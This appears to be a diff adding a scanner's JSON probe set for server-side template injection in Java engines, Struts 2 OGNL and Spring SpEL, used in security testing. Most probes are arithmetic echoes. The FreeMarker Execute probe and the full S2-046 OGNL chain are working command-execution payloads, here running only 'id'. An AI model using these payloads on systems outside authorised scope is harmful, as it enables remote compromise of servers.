@@ -1,0 +1,288 @@
+{
+  "category": "ssti_java",
+  "description": " \u2014 Java engines (FreeMarker, Thymeleaf, Pebble)",
+  "contexts": {
+    "freemarker": {
+      "description": "Server-Side Template Injection probes for Apache FreeMarker (Java/Spring/Tomcat stacks)",
+      "tech_match": [
+        "Java",
+        "Spring",
+        "Tomcat"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "${7*7}",
+          "description": "FreeMarker expression evaluation \u2014 49 confirms SSTI",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+          "description": "FreeMarker RCE probe via Execute class \u2014 uid= in response confirms code execution",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 95,
+          "variables": {}
+        }
+      ]
+    },
+    "thymeleaf": {
+      "description": "Server-Side Template Injection probes for Thymeleaf (Spring/Java stacks)",
+      "tech_match": [
+        "Spring",
+        "Java"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "__${7*7}__",
+          "description": "Thymeleaf preprocessing expression \u2014 49 confirms SSTI",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "pebble": {
+      "description": "Server-Side Template Injection probes for Java Pebble templates",
+      "tech_match": [
+        "Java",
+        "Spring"
+      ],
+      "param_match": [
+        "name",
+        "template",
+        "msg",
+        "text",
+        "title",
+        "comment",
+        "input",
+        "value",
+        "q"
+      ],
+      "probes": [
+        {
+          "payload": "{{ 7 * 7 }}",
+          "description": "Pebble arithmetic evaluation \u2014 49 confirms Pebble template processing",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{'freemarker.template.utility.Execute'?new()('id')}}",
+          "description": "Pebble RCE attempt via class instantiation \u2014 uid= confirms code execution if engine allows it",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "uid="
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {}
+        }
+      ]
+    },
+    "struts2_ognl_url_param": {
+      "description": "Apache Struts 2 OGNL injection via URL parameter (S2-001/057/059/061 family). OGNL expression in parameter value is evaluated when the framework binds the value to a model attribute. Detect via arithmetic echo: %{1337*1338} \u2192 1788906.",
+      "tech_match": [
+        "Struts 2",
+        "Struts2",
+        "Apache Struts"
+      ],
+      "param_match": [
+        "redirectUri",
+        "redirect",
+        "action",
+        "method",
+        "id",
+        "name"
+      ],
+      "probes": [
+        {
+          "payload": "%{1337*1338}",
+          "description": "OGNL arithmetic \u2014 if 1788906 appears in response, OGNL eval confirmed",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "1788906"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
+          "description": "S2-046 OGNL chain \u2014 DETECTION-ONLY uses benign `id` command per Rule 5; production exploit would use Collaborator OOB",
+          "note": "Operator-supervised \u2014 verify scope first; use Collaborator subdomain for OOB confirmation rather than this inband variant",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+\\("
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75
+        }
+      ]
+    },
+    "spel_arithmetic_echo": {
+      "description": "Spring SpEL arithmetic-echo probe \u2014 #{T(java.lang.Math).abs(-1337)*1338} evaluated by Spring expression context.",
+      "tech_match": [
+        "Spring",
+        "Spring Boot",
+        "Spring MVC"
+      ],
+      "param_match": [
+        "expression",
+        "expr",
+        "lang"
+      ],
+      "probes": [
+        {
+          "payload": "#{1337*1338}",
+          "description": "SpEL arithmetic \u2014 1788906 in response confirms SpEL eval",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "1788906"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "error_based_blind": {
+      "description": "Successful Errors (PortSwigger Top-10-2025 #1): force FreeMarker/Velocity/Thymeleaf to raise an exception echoing evaluated output. Blind SSTI extraction. Marker 1337=1336+1 inside the stack trace proves evaluation.",
+      "tech_match": ["FreeMarker", "Velocity", "Thymeleaf", "Java", "Spring"],
+      "param_match": ["name", "template", "q", "msg", "comment"],
+      "probes": [
+        {
+          "payload": "${1336+1}${undefined_zz.err}",
+          "description": "Trigger a FreeMarker error after evaluation; look for 1337 in the stack trace.",
+          "matchers": [
+            {"type": "regex", "pattern": "1337", "weight": 60},
+            {"type": "word", "words": ["freemarker", "InvalidReferenceException", "velocity", "TemplateException", "org.thymeleaf"], "condition": "or", "weight": 40}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "boolean_error_blind": {
+      "description": "Boolean-error oracle for JVM template engines: raise iff an evaluated condition holds.",
+      "tech_match": ["FreeMarker", "Velocity", "Java"],
+      "param_match": ["name", "template", "q"],
+      "probes": [
+        {
+          "payload": "<#if 7*7==49>1<#else>${err_zz}</#if>",
+          "description": "Differential error vs benign baseline.",
+          "matchers": [
+            {"type": "word", "words": ["Exception", "freemarker", "Error", "InvalidReference"], "condition": "or", "weight": 50}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
